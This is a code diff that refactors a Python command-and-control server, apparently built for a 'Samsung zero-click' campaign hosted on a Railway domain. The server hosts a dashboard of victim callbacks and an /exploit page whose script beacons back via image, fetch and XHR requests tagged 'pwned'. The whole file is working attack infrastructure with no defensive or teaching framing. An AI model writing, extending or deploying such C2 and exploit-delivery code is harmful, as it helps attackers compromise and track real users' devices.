@@ -1,4 +1,4 @@
-# core/c2.py — C2 Server with CORS Headers
+# core/c2.py — C2 Server with CORS Headers (FIXED)
 
 import json
 import time
@@ -18,6 +18,29 @@ class C2Handler(http.server.SimpleHTTPRequestHandler):
         self.send_header('Access-Control-Allow-Headers', 'Content-Type, X-Requested-With')
         self.send_header('Access-Control-Max-Age', '86400')
     
+    def _send_html(self, html):
+        """Send HTML response with CORS headers"""
+        self.send_response(200)
+        self._send_cors_headers()
+        self.send_header('Content-Type', 'text/html')
+        self.end_headers()
+        self.wfile.write(html.encode())
+    
+    def _send_json(self, data):
+        """Send JSON response with CORS headers"""
+        self.send_response(200)
+        self._send_cors_headers()
+        self.send_header('Content-Type', 'application/json')
+        self.end_headers()
+        self.wfile.write(json.dumps(data).encode())
+    
+    def _send_response(self, text):
+        """Send plain text response with CORS headers"""
+        self.send_response(200)
+        self._send_cors_headers()
+        self.end_headers()
+        self.wfile.write(text.encode())
+    
     def do_OPTIONS(self):
         """Handle preflight OPTIONS request"""
         self.send_response(200)
@@ -30,24 +53,14 @@ class C2Handler(http.server.SimpleHTTPRequestHandler):
         if parsed.path == '/':
             self._send_html(self._dashboard())
         elif parsed.path == '/ping':
-            self.send_response(200)
-            self._send_cors_headers()
-            self.end_headers()
-            self.wfile.write(b'pong')
+            self._send_response('pong')
         elif parsed.path == '/callbacks':
-            self.send_response(200)
-            self._send_cors_headers()
-            self.end_headers()
-            self.wfile.write(json.dumps(self.callbacks).encode())
+            self._send_json(self.callbacks)
         elif parsed.path == '/callback':
             params = parse_qs(parsed.query)
             self._process_callback(params)
-            self.send_response(200)
-            self._send_cors_headers()
-            self.end_headers()
-            self.wfile.write(b'OK')
+            self._send_response('OK')
         elif parsed.path == '/exploit':
-            # Serve the HTML exploit directly
             self._serve_exploit()
         else:
             self.send_response(404)
@@ -65,10 +78,7 @@ class C2Handler(http.server.SimpleHTTPRequestHandler):
         
         if self.path == '/callback':
             self._process_callback(info)
-            self.send_response(200)
-            self._send_cors_headers()
-            self.end_headers()
-            self.wfile.write(b'OK')
+            self._send_response('OK')
         else:
             self.send_response(404)
             self._send_cors_headers()
@@ -88,17 +98,13 @@ class C2Handler(http.server.SimpleHTTPRequestHandler):
     
     def _serve_exploit(self):
         """Serve the HTML exploit directly from C2"""
-        self.send_response(200)
-        self._send_cors_headers()
-        self.send_header('Content-Type', 'text/html')
-        self.end_headers()
-        
         html = self._get_exploit_html()
-        self.wfile.write(html.encode())
+        self._send_html(html)
     
     def _get_exploit_html(self):
         """Return the exploit HTML with CORS-friendly callbacks"""
-        callback_url = f"https://{self.headers.get('Host', 'samsung-zeroclick-production.up.railway.app')}/callback"
+        host = self.headers.get('Host', 'samsung-zeroclick-production.up.railway.app')
+        callback_url = f"https://{host}/callback"
         
         return f"""
         <!DOCTYPE html>
@@ -136,14 +142,14 @@ class C2Handler(http.server.SimpleHTTPRequestHandler):
 
                 log('Triggering exploit...');
 
-                // === IMAGE BEACON (BEST FOR CORS) ===
+                // === IMAGE BEACON ===
                 try {{
                     var img = new Image();
                     img.src = callbackUrl + '?pwned=img&ts=' + Date.now();
                     log('✅ Image beacon sent');
                 }} catch(e) {{ log('⚠️ Image failed'); }}
 
-                // === FETCH with no-cors ===
+                // === FETCH no-cors ===
                 try {{
                     fetch(callbackUrl + '?pwned=fetch&ts=' + Date.now(), {{
                         mode: 'no-cors',
@@ -152,7 +158,7 @@ class C2Handler(http.server.SimpleHTTPRequestHandler):
                     log('✅ Fetch sent');
                 }} catch(e) {{ log('⚠️ Fetch failed'); }}
 
-                // === XHR (with CORS enabled) ===
+                // === XHR ===
                 try {{
                     var xhr = new XMLHttpRequest();
                     xhr.open('GET', callbackUrl + '?pwned=xhr&ts=' + Date.now(), true);
@@ -202,6 +208,8 @@ class C2Handler(http.server.SimpleHTTPRequestHandler):
             for c in self.callbacks[-10:]
         ]) or '<tr><td colspan="3">No callbacks yet</td></tr>'
         
+        host = self.headers.get('Host', 'samsung-zeroclick-production.up.railway.app')
+        
         return f"""
         <!DOCTYPE html>
         <html>
@@ -221,6 +229,7 @@ class C2Handler(http.server.SimpleHTTPRequestHandler):
                 th{{background:#1c2c3c;padding:12px;text-align:left;color:#8ea4b8;font-weight:400}}
                 td{{padding:12px;border-bottom:1px solid #1c2c3c;font-size:13px}}
                 .refresh{{background:#4a9eff;color:#fff;border:none;padding:8px 20px;border-radius:8px;cursor:pointer}}
+                .refresh:hover{{background:#3b8cdf}}
                 .footer{{margin-top:40px;color:#6f8ba5;font-size:12px;text-align:center}}
                 .exploit-link{{background:#17212b;padding:12px;border-radius:8px;margin:10px 0;border:1px solid #4a9eff}}
                 .exploit-link a{{color:#4a9eff;word-break:break-all}}
@@ -233,7 +242,7 @@ class C2Handler(http.server.SimpleHTTPRequestHandler):
                 
                 <div class="exploit-link">
                     <strong>📤 Exploit Link:</strong><br>
-                    <a href="/exploit" target="_blank">{self.headers.get('Host', 'samsung-zeroclick-production.up.railway.app')}/exploit</a>
+                    <a href="/exploit" target="_blank">https://{host}/exploit</a>
                 </div>
                 
                 <div class="stats">
@@ -259,6 +268,7 @@ class C2Handler(http.server.SimpleHTTPRequestHandler):
     
     def log_message(self, *args): pass
 
+
 class C2Server:
     def __init__(self, host='0.0.0.0', port=8080):
         self.host = host
@@ -269,7 +279,9 @@ class C2Server:
         print(f"[C2] Dashboard: http://{self.host}:{self.port}/")
         print(f"[C2] Callback: http://{self.host}:{self.port}/callback")
         print(f"[C2] Exploit: http://{self.host}:{self.port}/exploit")
+        
         server = http.server.HTTPServer((self.host, self.port), C2Handler)
+        
         try:
             server.serve_forever()
         except KeyboardInterrupt:
